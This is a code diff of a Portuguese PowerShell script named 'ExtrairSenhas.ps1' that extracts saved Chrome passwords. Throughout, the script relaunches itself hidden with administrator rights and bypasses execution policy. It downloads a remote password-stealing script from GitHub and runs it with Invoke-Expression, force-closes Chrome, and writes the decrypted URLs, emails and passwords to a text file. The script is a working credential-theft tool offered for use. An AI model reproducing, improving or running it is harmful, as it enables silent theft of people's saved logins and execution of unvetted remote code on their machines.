@@ -1,4 +1,4 @@
-# ExtrairSenhas.ps1 - Versão usando Moonwalk (mais atual)
+# ExtrairSenhas.ps1 - Versão CORRIGIDA para Chrome atual
 
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
@@ -6,78 +6,44 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 $pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
-if (-not (Test-Path $pastaDocuments)) {
-    $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
-}
-
 $datahora = Get-Date -Format "yyyyMMdd_HHmmss"
-$arquivoSaida = Join-Path $pastaDocuments "senhas_completo_$datahora.txt"
+$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"
 
-# Cabeçalho
-$relatorio = @"
-========================================
-RELATÓRIO DE SENHAS (Moonwalk)
-Data: $(Get-Date -Format "dd/MM/yyyy HH:mm:ss")
-Computador: $env:COMPUTERNAME
-========================================
+# Limpa o arquivo anterior se existir
+if (Test-Path $arquivoSaida) { Remove-Item $arquivoSaida -Force }
 
-"@
+# Força o Chrome a liberar o banco de dados
+Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 2
 
-# Baixa e executa o Moonwalk (alternativa mais atual)
-Write-Host "Baixando Moonwalk (extrator atualizado)..." -ForegroundColor Cyan
-
-$moonwalkUrl = "https://raw.githubusercontent.com/mufeedvh/moonwalk/main/src/bin/moonwalk.ps1"
+# Tenta o script original com tratamento de erro
 try {
-    $moonwalk = IRM $moonwalkUrl -ErrorAction Stop
-    $relatorio += "[OK] Moonwalk carregado com sucesso`n"
-    Write-Host "Moonwalk carregado!" -ForegroundColor Green
-} catch {
-    $relatorio += "[ERRO] Falha ao carregar Moonwalk: $_`n"
-    $relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8
-    Start-Process notepad.exe $arquivoSaida
-    exit
-}
-
-$null = Invoke-Expression $moonwalk
-
-# Tenta extrair com Moonwalk
-$relatorio += "`n--- Chrome (via Moonwalk) ---`n"
-try {
-    $output = Get-ChromePasswords 2>&1
-    if ($output -match "@" -or $output -match "password") {
-        $relatorio += $output
-    } else {
-        $relatorio += "Nenhuma senha encontrada ou erro na extracao`n"
-    }
-} catch {
-    $relatorio += "ERRO: $($_.Exception.Message)`n"
-}
-
-# Também tenta com o método original (fallback)
-$relatorio += "`n--- Chrome (via PowerChrome - fallback) ---`n"
-try {
-    $script = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1'
-    $null = Invoke-Expression $script
+    $script = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' -ErrorAction Stop
+    Invoke-Expression $script
+    
+    # Executa e captura a saída
     $output = Invoke-PowerChrome -Browser Chrome 2>&1
-    if ($output -match "https://") {
-        $relatorio += $output
-    } else {
-        $relatorio += "PowerChrome tambem falhou. Pode ser necessario atualizar o Chrome ou o metodo de criptografia mudou.`n"
+    
+    # Filtra apenas linhas que contêm dados reais
+    $linhasFiltradas = $output | Where-Object {
+        $_ -match "https?://" -or 
+        $_ -match "@" -or 
+        ($_ -match "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" -and $_ -notmatch "Github|BCryptDecrypt|failed")
     }
-} catch {
-    $relatorio += "PowerChrome falhou: $($_.Exception.Message)`n"
+    
+    if ($linhasFiltradas.Count -gt 0) {
+        $linhasFiltradas | Out-File -FilePath $arquivoSaida -Encoding UTF8
+        Write-Host "SUCESSO! Senhas salvas em: $arquivoSaida" -ForegroundColor Green
+    } else {
+        "Nenhuma senha encontrada ou erro na descriptografia." | Out-File -FilePath $arquivoSaida -Encoding UTF8
+        Write-Host "Nenhuma senha encontrada." -ForegroundColor Yellow
+    }
+}
+catch {
+    "ERRO: $($_.Exception.Message)" | Out-File -FilePath $arquivoSaida -Encoding UTF8
+    Write-Host "Erro ao executar: $_" -ForegroundColor Red
 }
 
-$relatorio += "`n========================================`n"
-$relatorio += "FIM DO RELATÓRIO`n"
-$relatorio += "========================================`n"
-
-$relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8
-
-if (Test-Path $arquivoSaida) {
-    $tamanho = [math]::Round((Get-Item $arquivoSaida).Length / 1KB, 2)
-    Write-Host "Relatorio salvo em: $arquivoSaida ($tamanho KB)" -ForegroundColor Green
-    Start-Process notepad.exe $arquivoSaida
-}
-
+# Pequena pausa para garantir que o arquivo foi escrito
+Start-Sleep -Seconds 1
 exit
